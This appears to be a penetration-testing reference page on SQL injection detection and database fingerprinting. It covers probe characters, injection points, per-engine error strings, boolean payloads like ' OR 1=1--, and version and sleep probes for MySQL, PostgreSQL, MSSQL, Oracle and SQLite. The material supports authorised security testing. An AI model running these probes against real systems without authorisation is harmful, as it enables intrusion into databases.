# Detection & DBMS Fingerprinting

## Syntax probes

Send each individually and compare against a baseline (unmodified) request:

```
'   ''   "   `   ;   --   /*
```
A single `'` causing a SQL-specific error, while `''` (escaped) returns to normal, is the classic confirming pair — it shows the input lands inside a quoted string context and isn't being escaped.

## Where to inject (beyond the obvious parameter)

```
GET/POST parameters     JSON body field values (and, separately, field
                         names if the app builds dynamic queries from them)
XML body element/attribute values
Cookies                 X-Forwarded-For and other commonly-logged headers
URL path segments       Sort/order/filter/pagination parameters
Multipart form fields (including the filename itself, not just field values)
```
Sort/filter/pagination parameters deserve special attention: they frequently get concatenated directly into `ORDER BY`/`WHERE` clauses because developers assume only a fixed set of column names will ever be sent, and rarely think to parameterize something that "isn't really user data."

## Indicators something happened

```
- SQL-specific error text: "you have an error in your SQL syntax"
  (MySQL), "unterminated quoted string" (SQLite), "ORA-01756"
  (Oracle), "Unclosed quotation mark" (MSSQL), "syntax error at or
  near" (PostgreSQL)
- A generic 500 with no SQL-specific text — weaker, needs boolean/time
  follow-up before it counts as a lead
- Response content, length, or row-count differences between
  syntactically similar inputs
- An unexpected delay (move to `blind-and-oast-extraction.md`)
```

## Boolean condition testing

```
TRUE:  ' OR 1=1--
FALSE: ' OR 1=2--
```
Compare the two responses for content/length/row-count differences. If the TRUE condition returns more rows or different content than the FALSE one, injection is confirmed and you have a working true/false oracle to build on for blind extraction later.

## DBMS fingerprinting

Identifying the engine early focuses every subsequent phase on the right syntax — don't run MySQL payloads against what turns out to be PostgreSQL.

```
MySQL:
  SELECT @@version
  SELECT SLEEP(0)              (confirms MySQL specifically if it
                                 doesn't error — most other engines
                                 don't have a bare SLEEP() function)
  Comment styles: -- (needs a trailing space), #, /* */

PostgreSQL:
  SELECT version()
  SELECT pg_sleep(0)
  Comment styles: -- , /* */
  String concatenation: ||

MSSQL:
  SELECT @@version
  Comment styles: -- , /* */
  Stacked queries supported by default (test with a harmless second
  statement) — this matters a lot later for RCE escalation

Oracle:
  SELECT banner FROM v$version
  Requires FROM dual on any SELECT with no real table
  No semicolon-terminated stacked queries via standard JDBC in most
  configurations — escalation paths differ from MSSQL/Postgres

SQLite:
  SELECT sqlite_version()
  No SLEEP()/pg_sleep() equivalent at all — time-based detection
  needs a different approach, see `blind-and-oast-extraction.md`
  No native outbound network capability — OAST is effectively
  unavailable unless the app integrates SQLite with custom
  loadable extensions
```

## Confirming the fingerprint, not guessing it

A version string actually extracted via a confirmed technique (error-based, UNION, or blind) is a confirmed fingerprint. Inferring the DBMS purely from generic error phrasing or from the hosting stack's typical defaults (e.g., "it's PHP, so it's probably MySQL") is a reasonable starting guess but should be verified with an actual engine-specific probe (a `SLEEP()`/`pg_sleep()` call, a `v$version` read) before you commit subsequent testing time to that engine's specific syntax.
